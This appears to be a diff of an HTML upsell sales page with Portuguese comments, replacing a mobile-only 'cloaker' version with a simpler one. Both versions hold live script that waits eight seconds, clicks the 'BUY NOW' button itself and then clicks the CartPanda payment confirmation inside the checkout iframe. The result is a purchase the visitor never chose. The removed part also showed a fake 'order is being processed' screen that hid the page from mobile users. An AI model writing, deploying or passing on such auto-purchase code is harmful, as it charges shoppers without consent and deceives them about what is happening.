@@ -10,7 +10,7 @@
                 </script>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>TESTE6 - Special Offer</title>
+  <title>TESTE7 - Special Offer</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -146,131 +146,75 @@
 	  // Aguarda o conteúdo da página ser completamente carregado para iniciar o processo.
 	  document.addEventListener('DOMContentLoaded', () => {
 
-      // ===================================================================
-      // PARTE 1: CLOAKER (VERIFICADOR DE DISPOSITIVO)
-      // ===================================================================
-      const isMobile = /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+		// --- CONFIGURAÇÕES ---
+		const tempoDeEsperaEmSegundos = 8;
+		const seletorBotaoComprar = 'a.cta-button[href*="accepted=yes"]';
+		const seletorIframePopUp = 'iframe.cp-exocu-frame';
+		const idBotaoConfirmacaoFinal = 'cartpanda-payment-confirmation';
+		// -------------------
 
-      // Se não for um dispositivo móvel, o script para aqui.
-      if (!isMobile) {
-        console.log('Usuário de Desktop detectado. A página de upsell será exibida normalmente.');
-        return; 
-      }
+		console.log('Script de compra automática iniciado. Aguardando ' + tempoDeEsperaEmSegundos + ' segundos...');
 
-      // Se for um dispositivo móvel, o script continua.
-      console.log('Usuário de Celular/Tablet detectado. Ativando compra automática com tela de carregamento.');
-      
-      // ===================================================================
-      // PARTE 2: TELA DE CARREGAMENTO (LOADING)
-      // ===================================================================
-      function showLoadingScreen() {
-        // CSS seguro que centraliza o conteúdo e não conflita com a compra.
-        const loadingCSS = `
-          <style id="loading-style">
-            .loader-container {
-              position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-              background-color: #e3e8ee; z-index: 999999; font-family: Arial, sans-serif;
-            }
-            .loader-content-wrapper {
-              position: absolute; top: 50%; left: 50%;
-              transform: translate(-50%, -50%);
-              display: flex; flex-direction: column; align-items: center;
-            }
-            .loader-spinner {
-              border: 8px solid #cccccc; border-top: 8px solid #2180c0;
-              border-radius: 50%; width: 45px; height: 45px;
-              animation: spin 1s linear infinite; margin-bottom: 25px;
-            }
-            @keyframes spin {
-              0% { transform: rotate(0deg); }
-              100% { transform: rotate(360deg); }
-            }
-            .loader-text {
-              color: #525559; font-size: 18px; text-align: center;
-            }
-            .loader-text .title {
-              font-weight: bold; margin-bottom: 8px;
-            }
-          </style>
-        `;
+		// 1. Aguarda o tempo definido para iniciar a compra.
+		setTimeout(() => {
+		  console.log('Tempo de espera finalizado. Procurando o botão "BUY NOW"...');
+		  const botaoComprar = document.querySelector(seletorBotaoComprar);
 
-        // Estrutura HTML segura que não gera conflitos.
-        const loadingHTML = `
-          <div id="custom-loader" class="loader-container">
-            <div class="loader-content-wrapper">
-              <div class="loader-spinner"></div>
-              <div class="loader-text">
-                <p class="title">Your order is being processed.</p>
-                <p>Do not close this page.</p>
-              </div>
-            </div>
-          </div>
-        `;
+		  if (botaoComprar) {
+			console.log('Botão "BUY NOW" encontrado. Clicando para iniciar o pop-up de confirmação...');
+			botaoComprar.click();
 
-        document.head.insertAdjacentHTML('beforeend', loadingCSS);
-        document.body.insertAdjacentHTML('beforeend', loadingHTML);
-        
-        // Oculta o conteúdo original da página.
-        document.body.style.overflow = 'hidden';
-        const originalContent = Array.from(document.body.children).filter(el => el.id !== 'custom-loader' && el.tagName !== 'SCRIPT' && el.id !== 'loading-style');
-        originalContent.forEach(el => el.style.display = 'none');
-      }
+			// 2. Inicia o monitoramento para encontrar e confirmar o pop-up.
+			monitorarPopupDeConfirmacao();
+		  } else {
+			console.error('ERRO: O botão "BUY NOW" com o seletor "' + seletorBotaoComprar + '" não foi encontrado na página.');
+		  }
+		}, tempoDeEsperaEmSegundos * 1000);
 
-      // Exibe a tela de carregamento imediatamente.
-      showLoadingScreen();
+		/**
+		 * Esta função fica verificando a cada 250ms se o iframe do pop-up e o botão de
+		 * confirmação final já apareceram na tela para poder clicar nele.
+		 */
+		function monitorarPopupDeConfirmacao() {
+		  let tentativas = 0;
+		  const maxTentativas = 60; // Tenta por 15 segundos (60 * 250ms)
 
-      // ===================================================================
-      // PARTE 3: COMPRA AUTOMÁTICA (LÓGICA FUNCIONAL ORIGINAL)
-      // ===================================================================
-      const tempoDeEsperaEmSegundos = 8;
-      const seletorBotaoComprar = 'a.cta-button[href*="accepted=yes"]';
-      const seletorIframePopUp = 'iframe.cp-exocu-frame';
-      const idBotaoConfirmacaoFinal = 'cartpanda-payment-confirmation';
+		  console.log('Iniciando monitoramento do pop-up de confirmação...');
 
-      console.log('Script de compra automática iniciado em background. Aguardando ' + tempoDeEsperaEmSegundos + ' segundos...');
+		  const intervalo = setInterval(() => {
+			tentativas++;
+			if (tentativas > maxTentativas) {
+			  clearInterval(intervalo);
+			  console.error('ERRO: O pop-up de confirmação não apareceu após ' + (maxTentativas * 250 / 1000) + ' segundos.');
+			  return;
+			}
 
-      setTimeout(() => {
-        console.log('Tempo de espera finalizado. Procurando o botão "BUY NOW"...');
-        const botaoComprar = document.querySelector(seletorBotaoComprar);
-        if (botaoComprar) {
-          console.log('Botão "BUY NOW" encontrado. Clicando para iniciar o pop-up de confirmação...');
-          botaoComprar.click();
-          monitorarPopupDeConfirmacao();
-        } else {
-          console.error('ERRO: O botão "BUY NOW" com o seletor "' + seletorBotaoComprar + '" não foi encontrado na página.');
-        }
-      }, tempoDeEsperaEmSegundos * 1000);
+			const iframe = document.querySelector(seletorIframePopUp);
 
-      function monitorarPopupDeConfirmacao() {
-        let tentativas = 0;
-        const maxTentativas = 60;
-        console.log('Iniciando monitoramento do pop-up de confirmação...');
-        const intervalo = setInterval(() => {
-          tentativas++;
-          if (tentativas > maxTentativas) {
-            clearInterval(intervalo);
-            console.error('ERRO: O pop-up de confirmação não apareceu após ' + (maxTentativas * 250 / 1000) + ' segundos.');
-            return;
-          }
-          const iframe = document.querySelector(seletorIframePopUp);
-          if (iframe) {
-            console.log('Iframe do pop-up encontrado. Procurando pelo botão de confirmação final...');
-            try {
-              const iframeDocument = iframe.contentDocument || iframe.contentWindow.document;
-              const botaoConfirmacao = iframeDocument.getElementById(idBotaoConfirmacaoFinal);
-              if (botaoConfirmacao) {
-                console.log('Botão de confirmação final (' + idBotaoConfirmacaoFinal + ') encontrado. Realizando o clique!');
-                botaoConfirmacao.click();
-                clearInterval(intervalo);
-                console.log('Ação de clique para finalizar a compra foi executada com sucesso!');
-              }
-            } catch (e) {
-              clearInterval(intervalo);
-              console.error('ERRO de segurança ao tentar acessar o conteúdo do iframe.', e);
-            }
-          }
-        }, 250);
-      }
+			if (iframe) {
+			  console.log('Iframe do pop-up encontrado. Procurando pelo botão de confirmação final...');
+			  try {
+				// Acessa o documento dentro do iframe
+				const iframeDocument = iframe.contentDocument || iframe.contentWindow.document;
+				const botaoConfirmacao = iframeDocument.getElementById(idBotaoConfirmacaoFinal);
+
+				if (botaoConfirmacao) {
+				  console.log('Botão de confirmação final (' + idBotaoConfirmacaoFinal + ') encontrado. Realizando o clique!');
+				  
+				  // Clica no botão e para o monitoramento.
+				  botaoConfirmacao.click();
+				  clearInterval(intervalo);
+				  console.log('COMPRA DO UPSELL REALIZADA COM SUCESSO!');
+				} else {
+					 console.log('Ainda não encontrei o botão final, tentando novamente...');
+				}
+			  } catch (e) {
+				clearInterval(intervalo);
+				console.error('ERRO de segurança ao tentar acessar o conteúdo do iframe. Isso pode acontecer se o domínio do iframe for diferente. Detalhes:', e);
+			  }
+			}
+		  }, 250); // Verifica 4 vezes por segundo
+		}
 	  });
 	</script>
 
